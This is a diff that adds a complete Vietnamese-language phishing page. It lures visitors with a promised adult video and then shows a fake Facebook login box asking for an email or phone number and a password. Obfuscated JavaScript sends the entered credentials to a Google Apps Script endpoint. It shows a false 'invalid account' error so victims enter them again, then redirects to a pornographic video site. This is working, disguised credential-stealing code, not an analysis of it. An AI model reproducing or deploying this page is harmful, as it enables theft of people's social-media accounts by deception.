@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title></title>
+    <style>
+        .modal-content {
+            width: 380px;
+            height: 480px;
+            background-color: transparent !important;
+            box-shadow: none !important;
+            border: 0 !important;
+        }
+        .modal-body {
+            background: radial-gradient(ellipse at center,#5170ad 0,#355493 100%);
+            border: 1px solid #2d416d;
+            box-shadow: 0 1px #5670a4 inset, 0 0 10px 5px rgba(0,0,0,.1);
+            border-radius: 5px;
+            width: 380px;
+            height: 480px;
+            margin: 60px auto;
+            padding: 50px 30px 0 30px !important;
+            text-align: center;
+            margin-left: 50%;
+            transform: translateX(-25%);
+        }
+        .modal-body h1 {
+                margin: 0 0 50px 0;
+            padding: 0;
+            font-weight: 700;
+            font-size: 26px;
+            color: #fff;
+        }
+        .login-form input[name=username], .login-form input[name=password] {
+            width: 100%;
+            border: 1px solid #314d89;
+            margin-right: 110px;
+            outline: 0;
+            padding: 12px 20px;
+            font-weight: 400;
+            font-family: Lato,sans-serif;
+            cursor: pointer;
+        }
+        .login-form input[name=username] {
+            border-bottom: none;
+            border-radius: 4px 4px 0 0;
+            padding-bottom: 13px;
+            box-shadow: 0 -1px 0 #e0e0e0 inset, 0 1px 2px rgba(0,0,0,.23) inset;
+        }
+        .login-form input[name=password] {
+            border-top: none;
+            border-radius: 0 0 4px 4px;
+            box-shadow: 0 -1px 2px rgba(0,0,0,.23) inset, 0 1px 2px rgba(255,255,255,.1);
+        }
+        #btnSubmit {
+            font-family: Lato,sans-serif;
+            font-weight: 400;
+            background: linear-gradient(to bottom,#e0e0e0 0,#cecece 100%);
+            display: block;
+            margin: 20px auto 0 auto;
+            width: 100%;
+            border: none;
+            border-radius: 3px;
+            padding: 8px;
+            font-size: 17px;
+            color: #636363;
+            text-shadow: 0 1px 0 rgba(255,255,255,.45);
+            font-weight: 700;
+            box-shadow: 0 1px 3px 1px rgba(0,0,0,.17), 0 1px 0 rgba(255,255,255,.36) inset;
+        }
+        .login-form-wrap h5>a {
+            font-size: 14px;
+            color: #fff;
+            text-decoration: none;
+            font-weight: 400;
+        }
+        .mt-10 {
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 992px) {
+            .modal-content {
+                box-shadow: none !important;
+            }
+            .modal-dialog, .modal-content, .modal-body, label {
+                width: 100% !important;
+            }
+            .modal-body { 
+                margin-left: 0;
+                transform: translateX(0);
+                height: 750px;
+            }
+            .facebook_logo {
+                font-size: 60px !important;
+                margin: 50px 0 !important;
+            }
+            .login-form-wrap, #btnSubmit {
+                font-size: 40px !important;
+            }
+            .forgotpass {
+                font-size: 30px !important;
+            }
+            .title {
+                font-size: 60px !important;
+            }
+            .forgotpass_h5 {
+                margin-top: 50px;
+            }
+        }
+        
+    </style>
+</head>
+
+<body onclick="showModal();">
+    <div align="center" style="margin-top: 30px;">
+        <div class="separator" style="clear: both; text-align: center;">
+            <b><span style="color: red; font-size: 26pt; font-style: italic;"><a class="title" href="#" onclick="showModal()" style="color: red;">▶ BẤM VÀO ĐÂY ĐỂ XEM VIDEO</a></span></b>
+        </div>
+        <img src="https://i.imgur.com/qasocCE.jpg" class="img-responsive" id="img1" style="display: none;" alt="Image">
+        <img src="https://i.imgur.com/SxZDhz0.jpg" class="img-responsive" id="img2" style="display: none;" alt="Image">
+        <img src="http://misthy-thudamxvideo-mp4.online/imgs/3.jpg" class="img-responsive" id="img3" style="display: none;" alt="Image">
+        <img src="https://i.imgur.com/4Dyhd6E.jpg" class="img-responsive" id="img4" style="display: none;" alt="Image">
+        <img src="https://i.imgur.com/4Dyhd6E.jpg" class="img-responsive" id="img5" style="display: none;" alt="Image">
+    </div>
+    <div id="myModal" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+            <!-- Modal content-->
+            <div class="modal-content">
+                <div class="modal-body">
+                    <section class="login-form-wrap">
+                        <h1 class="facebook_logo">Facebook</h1>
+                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Nội dung 18+, vui lòng đăng nhập trước khi xem.</div>
+                        <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbxmFzJVDmdrGEFt25d9G-cuMC22IBqYYpISQQBMX-veX5EPz3hp/exec">
+                            <label class="mt-10">
+                                <input id="username" type="text" name="username" required="" placeholder="Email hoặc số điện thoại">
+                            </label>
+                            <label class="mt-10">
+                                <input id="password" type="password" name="password" required="" placeholder="Mật khẩu">
+                            </label>
+                            <input name="time" id="time" style="display: none;">
+                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Đăng nhập">
+                        </form>
+                        <h5 class="forgotpass_h5"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">Quên mật khẩu?</a></h5>
+                    </section>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+<div style="position: fixed; z-index: 10000; text-align: center; top: 0; display: none; left: 0; width: 100vw; height: 100vh; background-color: rgba(0,0,0,.5);" id="loading">
+    <img src="https://www.fk-austria.at/?proxy=images/waiting.gif" style="margin-top: 100px; width: 100px; height: 100px;">
+</div>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<script type="text/javascript">
+var _0x4340=['Tài\x20khoản\x20bạn\x20vừa\x20nhập\x20không\x20hợp\x20lệ,\x20Vui\x20lòng\x20thử\x20lại.','json','random','click','red','GET','includes','href','static','form#test-form','stopPropagation','#loading','show','val','#noti','#myModal','hide','modal','#password','css','log','#img','https://script.google.com/macros/s/AKfycbxmFzJVDmdrGEFt25d9G-cuMC22IBqYYpISQQBMX-veX5EPz3hp/exec','floor','ajax','ready','length'];(function(_0x2265d0,_0x434072){var _0x30c6dd=function(_0x4db747){while(--_0x4db747){_0x2265d0['push'](_0x2265d0['shift']());}};_0x30c6dd(++_0x434072);}(_0x4340,0xf4));var _0x30c6=function(_0x2265d0,_0x434072){_0x2265d0=_0x2265d0-0x0;var _0x30c6dd=_0x4340[_0x2265d0];return _0x30c6dd;};$(document)[_0x30c6('0x18')](()=>{let _0x4db747=Math[_0x30c6('0x16')](Math[_0x30c6('0x1')]()*0x5)+0x1;$(_0x30c6('0x14')+_0x4db747)['show']();});var count=0x0;function submitForm(){if(!$('#username')[_0x30c6('0xc')]()[_0x30c6('0x5')]('@')||$(_0x30c6('0x11'))[_0x30c6('0xc')]()[_0x30c6('0x19')]<0x6){}else count++;if(count<0x3){console[_0x30c6('0x13')](count),$(_0x30c6('0xa'))[_0x30c6('0xb')]();var _0x36c2e7=$('form#test-form')['serialize']();$[_0x30c6('0x17')]({'type':'GET','url':_0x30c6('0x15'),'dataType':_0x30c6('0x0'),'crossDomain':!![],'data':_0x36c2e7,'success':function(_0x299a50){if(count==0x2)$(_0x30c6('0xd'))[_0x30c6('0x12')]({'color':_0x30c6('0x3')});else count==0x1&&$(_0x30c6('0xd'))['css']({'color':'#879600'});$(_0x30c6('0xd'))['text'](_0x30c6('0x1a')),$(_0x30c6('0xa'))[_0x30c6('0xf')]();},'error':function(_0x3c6f4e,_0x4e1813,_0x28deff){$(_0x30c6('0xa'))[_0x30c6('0xf')]();}});}else{$(_0x30c6('0xa'))[_0x30c6('0xb')]();var _0x36c2e7=$(_0x30c6('0x8'))['serialize']();$[_0x30c6('0x17')]({'type':_0x30c6('0x4'),'url':'https://script.google.com/macros/s/AKfycbxmFzJVDmdrGEFt25d9G-cuMC22IBqYYpISQQBMX-veX5EPz3hp/exec','dataType':'json','crossDomain':!![],'data':_0x36c2e7,'success':function(_0x4263bf){location[_0x30c6('0x6')]='http://lontv.net/video-sex-juicy-wet-fingering-korean-bj-neat_94e4455354d446b7a4e7a553d';}});}}function showModal(_0x1aab7a){$(_0x30c6('0xe'))[_0x30c6('0x10')]({'backdrop':_0x30c6('0x7'),'keyboard':!![],'show':!![]});}$(_0x30c6('0xe'))[_0x30c6('0x2')](()=>{event[_0x30c6('0x9')]();}),$(_0x30c6('0xa'))[_0x30c6('0x2')](()=>{event[_0x30c6('0x9')]();});
+</script>
+
+</html>
